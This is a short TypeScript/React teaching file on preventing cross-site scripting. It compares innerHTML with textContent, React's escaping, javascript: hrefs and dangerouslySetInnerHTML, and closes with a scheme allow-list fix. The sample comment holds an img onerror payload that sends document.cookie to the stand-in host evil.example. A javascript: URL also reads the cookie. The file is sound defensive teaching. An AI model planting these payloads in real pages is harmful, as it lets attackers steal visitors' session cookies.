// LEARN(design.architecture.security): XSS is stopped by encoding at output, and every sink has its own rules.
import { renderToStaticMarkup } from "react-dom/server";

// Stored by another user. Both passed validation: non-empty, under 500 characters.
const comment = `Harika ders! <img alt="" onerror="fetch('//evil.example?c='+document.cookie)">`;
const website = "javascript:alert(document.cookie)";

// DOM sinks: innerHTML parses its input as markup, textContent never does.
const viaHTML = document.createElement("div");
viaHTML.innerHTML = comment;
const viaText = document.createElement("div");
viaText.textContent = comment;
console.log("innerHTML   created:", [...viaHTML.querySelectorAll("*")].map((e) => e.outerHTML));
console.log("textContent created:", viaText.children.length, "elements");

// React escapes text children and attribute values...
console.log(renderToStaticMarkup(<p>{comment}</p>));
// ...but an attribute's *meaning* is not its encoding: a javascript: URL is a valid href.
console.log(renderToStaticMarkup(<a href={website}>my site</a>));
// And the escape hatch is named for what it is.
console.log(renderToStaticMarkup(<p dangerouslySetInnerHTML={{ __html: comment }} />));

// The fix for URLs is an allow-list of schemes, applied where the value is used.
function safeHref(raw: string): string | undefined {
  try {
    const url = new URL(raw);
    return url.protocol === "https:" || url.protocol === "http:" ? url.href : undefined;
  } catch {
    return undefined; // not an absolute URL
  }
}
for (const raw of [website, "https://ışıl.dev/notlar", " JaVaScRiPt:alert(1)"]) {
  console.log(JSON.stringify(raw), "->", safeHref(raw) ?? "(no link)");
}
